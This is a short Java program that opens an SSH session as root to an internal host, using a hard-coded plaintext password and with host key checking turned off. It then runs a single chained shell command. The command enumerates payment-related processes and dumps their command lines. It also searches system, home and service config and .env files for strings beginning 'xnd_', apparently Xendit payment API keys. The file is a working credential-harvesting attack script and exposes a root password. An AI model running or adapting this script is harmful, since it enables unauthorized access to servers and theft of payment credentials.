import com.jcraft.jsch.*;
import java.io.*;
class SSC {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    Session s = j.getSession("root", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    String cmd = "id;hostname;echo ---NOXIFY-PROCS---;ps aux | grep -iE 'noxify|xendit|neo|payment' | grep -v grep;echo ---CMDLINE---;for pid in $(pgrep -f noxify); do echo PID=$pid; tr '\\0' ' ' < /proc/$pid/cmdline; echo; done;echo ---XENDIT-GREP---;grep -r 'xnd_' /etc/ /opt/ /home/ /var/ /srv/ --include='*.properties' --include='*.conf' --include='*.yml' --include='*.yaml' --include='*.xml' --include='*.env' 2>/dev/null | head -20";
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand(cmd);
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
